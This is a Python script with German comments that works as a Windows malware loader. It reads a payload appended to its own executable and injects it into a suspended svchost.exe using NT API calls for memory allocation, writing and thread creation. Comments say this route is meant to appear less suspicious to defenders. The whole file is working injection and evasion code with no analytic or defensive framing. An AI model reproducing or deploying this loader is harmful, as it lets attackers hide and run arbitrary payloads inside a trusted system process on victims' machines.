import ctypes
from ctypes import wintypes
import sys
import os

# --- Globale Konfiguration & Konstanten ---
TARGET_PROCESS = r"C:\Windows\System32\svchost.exe"
PAYLOAD_MARKER = b"###PAYLOAD_START###"

# --- Windows API Definitionen & Strukturen ---
# Wir benötigen die gleichen Basis-Strukturen wie zuvor.
CREATE_SUSPENDED = 0x00000004
DETACHED_PROCESS = 0x00000008
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
NTSTATUS = wintypes.LONG

# Standard Strukturen
class STARTUPINFOA(ctypes.Structure):
    _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPSTR), ("lpDesktop", wintypes.LPSTR), ("lpTitle", wintypes.LPSTR), ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD), ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD), ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD), ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD), ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD), ("lpReserved2", ctypes.POINTER(wintypes.BYTE)), ("hStdInput", wintypes.HANDLE), ("hStdOutput", wintypes.HANDLE), ("hStdError", wintypes.HANDLE)]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [("hProcess", wintypes.HANDLE), ("hThread", wintypes.HANDLE), ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

# --- Syscall Implementierung ---
# Hier liegt die Magie. Wir definieren die Funktionsprototypen für die NT-Funktionen.
ntdll = ctypes.windll.ntdll

# NtAllocateVirtualMemory
NtAllocateVirtualMemory = ntdll.NtAllocateVirtualMemory
NtAllocateVirtualMemory.restype = NTSTATUS
NtAllocateVirtualMemory.argtypes = [
    wintypes.HANDLE,       # ProcessHandle
    ctypes.POINTER(wintypes.LPVOID), # BaseAddress
    wintypes.ULONG,        # ZeroBits
    ctypes.POINTER(ctypes.c_size_t), # RegionSize
    wintypes.ULONG,        # AllocationType
    wintypes.ULONG         # Protect
]

# NtWriteVirtualMemory
NtWriteVirtualMemory = ntdll.NtWriteVirtualMemory
NtWriteVirtualMemory.restype = NTSTATUS
NtWriteVirtualMemory.argtypes = [
    wintypes.HANDLE,       # ProcessHandle
    wintypes.LPVOID,       # BaseAddress
    wintypes.LPCVOID,      # Buffer
    ctypes.c_size_t,       # NumberOfBytesToWrite
    ctypes.POINTER(ctypes.c_size_t) # NumberOfBytesWritten
]

# NtCreateThreadEx
# Diese Struktur ist komplex und undokumentiert.
class THREAD_START_PARAMETER(ctypes.Structure):
    _fields_ = [("lpStartAddress", wintypes.LPVOID), ("lpParameter", wintypes.LPVOID)]

NtCreateThreadEx = ntdll.NtCreateThreadEx
NtCreateThreadEx.restype = NTSTATUS
NtCreateThreadEx.argtypes = [
    ctypes.POINTER(wintypes.HANDLE), # ThreadHandle
    wintypes.ACCESS_MASK,      # DesiredAccess
    wintypes.LPVOID,           # ObjectAttributes
    wintypes.HANDLE,           # ProcessHandle
    wintypes.LPVOID,           # lpStartAddress
    wintypes.LPVOID,           # lpParameter
    wintypes.BOOL,             # CreateSuspended
    wintypes.ULONG,            # StackZeroBits
    wintypes.ULONG,            # SizeOfStackCommit
    wintypes.ULONG,            # SizeOfStackReserve
    wintypes.LPVOID            # lpBytesBuffer
]

# --- Hauptlogik ---

def get_payload():
    """Liest die Payload aus der eigenen ausführbaren Datei, identifiziert durch einen Marker."""
    try:
        executable_path = sys.executable
        with open(executable_path, "rb") as f:
            full_content = f.read()
        marker_pos = full_content.find(PAYLOAD_MARKER)
        if marker_pos == -1: return None
        return full_content[marker_pos + len(PAYLOAD_MARKER):]
    except:
        return None

def run(target_process):
    """Führt die Injektion mittels direkter Syscalls für die kritischen Operationen durch."""
    payload_buffer = get_payload()
    if not payload_buffer: return

    # Schritt 1: Prozess erstellen (noch mit der Standard-API, aber suspendiert)
    # Dies ist weniger verdächtig als ein Prozess, der aus dem Nichts Speicher alloziert.
    startup_info = STARTUPINFOA()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()

    try:
        created = ctypes.windll.kernel32.CreateProcessA(
            target_process.encode('utf-8'), None, None, None, False,
            CREATE_SUSPENDED | DETACHED_PROCESS, None, None,
            ctypes.byref(startup_info), ctypes.byref(process_info)
        )
        if not created: return
    except:
        return

    h_process = process_info.hProcess
    h_thread = process_info.hThread
    
    # Schritt 2: Speicher allozieren (via direktem Syscall)
    base_address = wintypes.LPVOID(0)
    region_size = ctypes.c_size_t(len(payload_buffer))
    status = NtAllocateVirtualMemory(h_process, ctypes.byref(base_address), 0, ctypes.byref(region_size), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if status != 0: # NT_SUCCESS = 0
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    # Schritt 3: Payload schreiben (via direktem Syscall)
    bytes_written = ctypes.c_size_t(0)
    status = NtWriteVirtualMemory(h_process, base_address, payload_buffer, len(payload_buffer), ctypes.byref(bytes_written))
    if status != 0:
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    # Schritt 4: Thread erstellen (via direktem Syscall)
    h_new_thread = wintypes.HANDLE(0)
    # GENERIC_ALL
    desired_access = 0x1FFFFF
    
    status = NtCreateThreadEx(
        ctypes.byref(h_new_thread), desired_access, None, h_process,
        base_address, # Startadresse ist unsere Payload
        None, False, 0, 0, 0, None
    )
    if status != 0:
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    # Aufräumen. Wir benötigen den suspendierten Hauptthread nicht mehr.
    ctypes.windll.kernel32.TerminateThread(h_thread, 0)
    ctypes.windll.kernel32.CloseHandle(h_thread)
    ctypes.windll.kernel32.CloseHandle(h_process)
    ctypes.windll.kernel32.CloseHandle(h_new_thread)


if __name__ == "__main__":
    run(TARGET_PROCESS) 